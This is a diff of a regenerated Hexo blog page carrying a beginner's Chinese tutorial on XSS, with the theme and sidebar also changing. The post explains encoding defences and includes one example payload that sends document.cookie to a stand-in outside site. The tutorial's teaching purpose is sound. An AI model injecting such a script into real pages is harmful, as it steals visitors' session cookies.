@@ -5,7 +5,7 @@
   
 
 
-<html class="theme-next muse use-motion" lang="zh-Hans">
+<html class="theme-next mist use-motion" lang="zh-Hans">
 <head>
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -26,10 +26,6 @@
 
 
 
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -84,27 +80,15 @@
 
 
 
-<meta name="description" content="最近在看一些关于网络安全的问题，跟前端相关的包括且不局限于xss和xsrf 了，那么一休哥就结合最近的学习谈一些粗浅的了解和实验。（(^o^)/，我是一个喜欢做实验的家伙）
-XSS（Cross site script）攻击！
-
-XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是在后面谈到XSRF防御的时候。简单来说XSS就是来自外部输入的脚本被注入到了受害网站（~ o ~, 被公鸡了），如">
 <meta property="og:type" content="article">
 <meta property="og:title" content="注意安全！XSS 和 XSRF">
 <meta property="og:url" content="http://alex2wong.github.io/2016/12/02/1注意安全！XSS 和 XSRF/index.html">
 <meta property="og:site_name" content="Space Shuttle">
-<meta property="og:description" content="最近在看一些关于网络安全的问题，跟前端相关的包括且不局限于xss和xsrf 了，那么一休哥就结合最近的学习谈一些粗浅的了解和实验。（(^o^)/，我是一个喜欢做实验的家伙）
-XSS（Cross site script）攻击！
-
-XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是在后面谈到XSRF防御的时候。简单来说XSS就是来自外部输入的脚本被注入到了受害网站（~ o ~, 被公鸡了），如">
 <meta property="og:image" content="http://img.blog.csdn.net/20161126164628074">
 <meta property="og:image" content="http://img.blog.csdn.net/20161126165433702">
-<meta property="og:updated_time" content="2017-07-28T02:37:34.526Z">
+<meta property="og:updated_time" content="2018-03-06T10:29:45.255Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="注意安全！XSS 和 XSRF">
-<meta name="twitter:description" content="最近在看一些关于网络安全的问题，跟前端相关的包括且不局限于xss和xsrf 了，那么一休哥就结合最近的学习谈一些粗浅的了解和实验。（(^o^)/，我是一个喜欢做实验的家伙）
-XSS（Cross site script）攻击！
-
-XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是在后面谈到XSRF防御的时候。简单来说XSS就是来自外部输入的脚本被注入到了受害网站（~ o ~, 被公鸡了），如">
 <meta name="twitter:image" content="http://img.blog.csdn.net/20161126164628074">
 
 
@@ -113,9 +97,9 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
   var NexT = window.NexT || {};
   var CONFIG = {
     root: '/',
-    scheme: 'Muse',
+    scheme: 'Mist',
     sidebar: {"position":"left","display":"post"},
-    fancybox: true,
+    fancybox: false,
     motion: true,
     duoshuo: {
       userId: '0',
@@ -202,22 +186,32 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
         </li>
       
         
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             归档
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
           </a>
         </li>
       
@@ -298,6 +292,35 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
           </span>
 
           
+            <span class="post-category" >
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/前端/" itemprop="url" rel="index">
+                    <span itemprop="name">前端</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -323,7 +346,7 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
       
 
       
-        <p>最近在看一些关于网络安全的问题，跟前端相关的包括且不局限于<strong>xss和xsrf </strong>了，那么<strong>一休哥</strong>就结合最近的学习谈一些粗浅的了解和实验。（(^o^)/，我是一个喜欢做实验的家伙）</p>
+        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p="">最近在看一些关于网络安全的问题，跟前端相关的包括且不局限于<strong>xss和xsrf </strong>了，那么<strong>一休哥</strong>就结合最近的学习谈一些粗浅的了解和实验。（(^o^)/，我是一个喜欢做实验的家伙）<p></p>
 <h3 id="XSS（Cross-site-script）攻击！"><a href="#XSS（Cross-site-script）攻击！" class="headerlink" title="XSS（Cross site script）攻击！"></a>XSS（Cross site script）攻击！</h3><hr>
 
 <p>XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是在后面谈到XSRF防御的时候。简单来说XSS就是来自外部输入的脚本被注入到了受害网站（~ o ~, 被公鸡了），如果该网站没有对临时加入DOM 结构的 JS 脚本进行过滤，那么这段脚本可能被之后访问该网站的用户浏览器执行。 </p>
@@ -333,7 +356,7 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
 <p>那么这段字符串POST给了稚嫩的服务器，没有Encode，啥都没做。原封不动加入了原本的HTML页面，那么当其他用户查看该文章的时候浏览器就会<strong>自动执行DOM Tree中的这句 JS 语句</strong>，弹出来 吓人+_+…</p>
 <p>这还不算啥，顶多就是烦人。但如果评论里面写的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;window.open(www.yixiuge.com?content=document.cookie);&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p>我擦。。当你访问小熊哥博文时，你在当前域名下的cookie被一休哥设置的什么鬼网站给get到了。。www.yixiuge.com 这个网站的后台程序会拿到你的cookie，然后借此cookie登陆你的简书，乱发段子。<br>当然一般来说服务器端返回的httpResponse中setCookie字段中会设置httpOnly，也就是脚本无法获取cookie，只有<strong>httpRequest会自带cookie</strong>。我们这里只是做一个简单示例</p>
-<p>其实，有个非常棒的图展示了整个XSS攻击的过程：<br><img src="http://img.blog.csdn.net/20161126164628074" alt="这里写图片描述"></p>
+<p>其实，有个非常棒的图展示了整个XSS攻击的过程：<br><a href="http://img.blog.csdn.net/20161126164628074" title="这里写图片描述" class="gallery-item" target="_blank" rel="external"><img src="http://img.blog.csdn.net/20161126164628074" alt="这里写图片描述"></a></p>
 <center>HOW XSS WORKS</center>
 
 <p>所以作为一个合格的WebApp，不能相信任何用户输入内容， 更不能未加处理就直接Print到HTML DOM 结构里。当今主流的一些前端框架（Angular 2.1，都已经2.1了。。。）都实现了对XSS的防御，结合服务器端程序更是可以防御XSRF（Cross site request forgery 跨站伪造请求）</p>
@@ -345,12 +368,17 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
 <p>举个栗子：</p>
 <p>用户输入评论是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(&quot; peiqian!&quot;)&lt;/script&gt;</div></pre></td></tr></table></figure></p>
 <p>无害处理后字符串是：</p>
-<p><img src="http://img.blog.csdn.net/20161126165433702" alt="这里写图片描述"></p>
+<p><a href="http://img.blog.csdn.net/20161126165433702" title="这里写图片描述" class="gallery-item" target="_blank" rel="external"><img src="http://img.blog.csdn.net/20161126165433702" alt="这里写图片描述"></a></p>
 <p>转换背后的机制是一套特殊符号 和 安全字符的映射表， 而且这个跟浏览器对HTML的渲染机制有关。各大浏览器中的JS引擎碰到script这样的标签，会解析其中的代码，并且执行。但碰到 &amp;lt &amp;gt  这样的字符就不会当做JS 执行，而是作为普通字符串打印。大家可以试试看Encode 前后这个例子在浏览器中的表现。</p>
 <p>那么除了大型框架，有木有自动Encode 的工具呢？发现一个，可以用用看。附上链接：<a href="https://github.com/mathiasbynens/he" target="_blank" rel="external">HTML entities</a>。 好吧，这次说了XSS，下一篇再说一下XSRF的危害和防御机制。</p>
 <p>参考文章：<br><a href="http://www.acunetix.com/websitesecurity/cross-site-scripting" target="_blank" rel="external">cross-site-scripting</a></p>
 <p><a href="http://excess-xss.com/" target="_blank" rel="external">全面学习XSS</a></p>
-
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script src="/lib/lg-thumbnail.js"></script><script src="/lib/lg-pager.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
       
     </div>
 
@@ -457,24 +485,31 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
                src="/images/avatar.gif"
                alt="alex huang" />
           <p class="site-author-name" itemprop="name">alex huang</p>
-          <p class="site-description motion-element" itemprop="description">blog of Alex2wong</p>
+          <p class="site-description motion-element" itemprop="description">blog of Alex2wong, love visulization, coding, photography</p>
         </div>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">8</span>
+              <span class="site-state-item-count">10</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
 
           
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
 
           
             <div class="site-state-item site-state-tags">
-              <a href="/tags">
-                <span class="site-state-item-count">14</span>
+              
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">标签</span>
-              </a>
+              
             </div>
           
 
@@ -491,6 +526,15 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
                     <i class="fa fa-fw fa-github"></i>
                   
                   GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/Alex_UndefinedO" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
                 </a>
               </span>
             
@@ -539,7 +583,7 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -554,7 +598,7 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
 <div class="theme-info">
   主题 -
   <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Muse
+    NexT.Mist
   </a>
 </div>
 
@@ -586,8 +630,6 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
 
 
 
-  
-
 
 
   
@@ -604,9 +646,6 @@ XSS 意思就是跨站脚本。这里面也涉及到跨域的问题，特别是�
 
   
   <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
 
 
   
